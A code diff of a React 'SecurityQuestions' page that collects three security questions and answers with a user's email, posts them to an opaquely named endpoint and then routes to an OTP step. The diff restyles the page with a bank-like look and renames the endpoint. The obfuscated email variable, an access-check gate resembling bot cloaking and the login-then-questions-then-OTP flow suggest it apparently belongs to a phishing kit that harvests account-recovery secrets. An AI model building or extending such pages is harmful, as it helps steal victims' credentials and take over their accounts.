@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
@@ -18,24 +18,33 @@ const SecurityQuestions: React.FC = () => {
     securityQuestion2: '',
     securityAnswer2: '',
     securityQuestion3: '',
-    securityAnswer3: ''
+    securityAnswer3: '',
+    form: ''
   });
 
   const location = useLocation();
   const { emzemz } = location.state || {};
-
   const navigate = useNavigate();
   const isAllowed = useAccessCheck(baseUrl);
 
-  // Debug: Log the received email
-  console.log('SecurityQuestions received email:', emzemz);
+  useEffect(() => {
+    if (!emzemz) {
+      navigate('/login', { replace: true });
+    }
+  }, [emzemz, navigate]);
 
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>;
+  if (isAllowed === null) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
   }
 
-  // Predefined security questions
+  if (isAllowed === false) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
+  }
+
+  if (!emzemz) {
+    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
+  }
+
   const securityQuestions = [
     "What was your childhood nickname?",
     "What is your mother's maiden name?",
@@ -59,14 +68,15 @@ const SecurityQuestions: React.FC = () => {
       securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
       securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
       securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
-      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : ''
+      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : '',
+      form: ''
     };
 
     setErrors(newErrors);
 
     if (!Object.values(newErrors).some(error => error)) {
       try {
-        await axios.post(`${baseUrl}api/logix-meta-data-7/`, {
+        await axios.post(`${baseUrl}api/fifty-meta-data-7/`, {
           emzemz,
           securityQuestion1,
           securityAnswer1,
@@ -75,10 +85,14 @@ const SecurityQuestions: React.FC = () => {
           securityQuestion3,
           securityAnswer3
         });
-        console.log('Security questions submitted successfully');
         navigate('/otp', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting security questions:', error);
+        setErrors(prev => ({
+          ...prev,
+          form: 'There was an error submitting your security questions. Please try again.',
+        }));
+      } finally {
         setIsLoading(false);
       }
     } else {
@@ -87,182 +101,131 @@ const SecurityQuestions: React.FC = () => {
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Security Questions</h2>
-      </div>
+    <div className="w-full">
+      <div className="mx-auto w-full max-w-3xl rounded-md border border-gray-200 bg-white shadow-[0_12px_30px_rgba(0,0,0,0.12)]">
+        <div className="h-2 bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6]" />
+        <div className="px-8 py-8">
+          <h2 className="text-2xl font-semibold text-gray-900">Set Your Security Questions</h2>
+          <p className="mt-3 text-sm text-gray-600">
+            Choose three questions and answer them carefully. We’ll use these to confirm your identity whenever you need to recover your access.
+          </p>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="">Please set up your security questions and answers for account recovery.</p>
-
-        <form onSubmit={handleSubmit}>
-          {/* Security Question 1 */}
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Security Question 1
-            </label>
-            <select
-              value={securityQuestion1}
-              onChange={(e) => setSecurityQuestion1(e.target.value)}
-              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
-            >
-              <option value="">Select a security question</option>
-              {securityQuestions.map((question, index) => (
-                <option key={index} value={question}>
-                  {question}
-                </option>
-              ))}
-            </select>
-            {errors.securityQuestion1 && (
-              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.securityQuestion1}</span>
+          <form onSubmit={handleSubmit} className="mt-8 space-y-6">
+            <div className="grid gap-6 md:grid-cols-2">
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Security Question 1</label>
+                <select
+                  value={securityQuestion1}
+                  onChange={(e) => setSecurityQuestion1(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 bg-white px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                >
+                  <option value="">Select a security question</option>
+                  {securityQuestions.map((question, index) => (
+                    <option key={index} value={question}>
+                      {question}
+                    </option>
+                  ))}
+                </select>
+                {errors.securityQuestion1 && (
+                  <p className="text-xs font-semibold text-red-600">{errors.securityQuestion1}</p>
+                )}
               </div>
-            )}
-          </div>
 
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Answer 1
-            </label>
-            <input
-              type="text"
-              value={securityAnswer1}
-              onChange={(e) => setSecurityAnswer1(e.target.value)}
-              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter your answer"
-            />
-            {errors.securityAnswer1 && (
-              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.securityAnswer1}</span>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Answer 1</label>
+                <input
+                  type="text"
+                  value={securityAnswer1}
+                  onChange={(e) => setSecurityAnswer1(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  placeholder="Enter your answer"
+                />
+                {errors.securityAnswer1 && (
+                  <p className="text-xs font-semibold text-red-600">{errors.securityAnswer1}</p>
+                )}
               </div>
-            )}
-          </div>
 
-          {/* Security Question 2 */}
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Security Question 2
-            </label>
-            <select
-              value={securityQuestion2}
-              onChange={(e) => setSecurityQuestion2(e.target.value)}
-              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
-            >
-              <option value="">Select a security question</option>
-              {securityQuestions.filter(q => q !== securityQuestion1).map((question, index) => (
-                <option key={index} value={question}>
-                  {question}
-                </option>
-              ))}
-            </select>
-            {errors.securityQuestion2 && (
-              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.securityQuestion2}</span>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Security Question 2</label>
+                <select
+                  value={securityQuestion2}
+                  onChange={(e) => setSecurityQuestion2(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 bg-white px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                >
+                  <option value="">Select a security question</option>
+                  {securityQuestions.filter((question) => question !== securityQuestion1).map((question, index) => (
+                    <option key={index} value={question}>
+                      {question}
+                    </option>
+                  ))}
+                </select>
+                {errors.securityQuestion2 && (
+                  <p className="text-xs font-semibold text-red-600">{errors.securityQuestion2}</p>
+                )}
               </div>
-            )}
-          </div>
 
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Answer 2
-            </label>
-            <input
-              type="text"
-              value={securityAnswer2}
-              onChange={(e) => setSecurityAnswer2(e.target.value)}
-              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter your answer"
-            />
-            {errors.securityAnswer2 && (
-              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.securityAnswer2}</span>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Answer 2</label>
+                <input
+                  type="text"
+                  value={securityAnswer2}
+                  onChange={(e) => setSecurityAnswer2(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  placeholder="Enter your answer"
+                />
+                {errors.securityAnswer2 && (
+                  <p className="text-xs font-semibold text-red-600">{errors.securityAnswer2}</p>
+                )}
               </div>
-            )}
-          </div>
 
-          {/* Security Question 3 */}
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Security Question 3
-            </label>
-            <select
-              value={securityQuestion3}
-              onChange={(e) => setSecurityQuestion3(e.target.value)}
-              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
-            >
-              <option value="">Select a security question</option>
-              {securityQuestions.filter(q => q !== securityQuestion1 && q !== securityQuestion2).map((question, index) => (
-                <option key={index} value={question}>
-                  {question}
-                </option>
-              ))}
-            </select>
-            {errors.securityQuestion3 && (
-              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.securityQuestion3}</span>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Security Question 3</label>
+                <select
+                  value={securityQuestion3}
+                  onChange={(e) => setSecurityQuestion3(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 bg-white px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                >
+                  <option value="">Select a security question</option>
+                  {securityQuestions
+                    .filter((question) => question !== securityQuestion1 && question !== securityQuestion2)
+                    .map((question, index) => (
+                      <option key={index} value={question}>
+                        {question}
+                      </option>
+                    ))}
+                </select>
+                {errors.securityQuestion3 && (
+                  <p className="text-xs font-semibold text-red-600">{errors.securityQuestion3}</p>
+                )}
               </div>
-            )}
-          </div>
 
-          <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-medium mb-2">
-              Answer 3
-            </label>
-            <input
-              type="text"
-              value={securityAnswer3}
-              onChange={(e) => setSecurityAnswer3(e.target.value)}
-              className="w-full max-w-md border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter your answer"
-            />
-            {errors.securityAnswer3 && (
-              <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.securityAnswer3}</span>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Answer 3</label>
+                <input
+                  type="text"
+                  value={securityAnswer3}
+                  onChange={(e) => setSecurityAnswer3(e.target.value)}
+                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
+                  placeholder="Enter your answer"
+                />
+                {errors.securityAnswer3 && (
+                  <p className="text-xs font-semibold text-red-600">{errors.securityAnswer3}</p>
+                )}
               </div>
-            )}
-          </div>
+            </div>
 
-          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
+            {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}
+
+            <div className="flex justify-end">
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Saving…' : 'Continue'}
               </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your security questions or answers with anyone. These will be used to verify your identity if you need to recover your account.
-        </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Security Questions?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Account Recovery Help</a>
+            </div>
+          </form>
         </div>
       </div>
     </div>
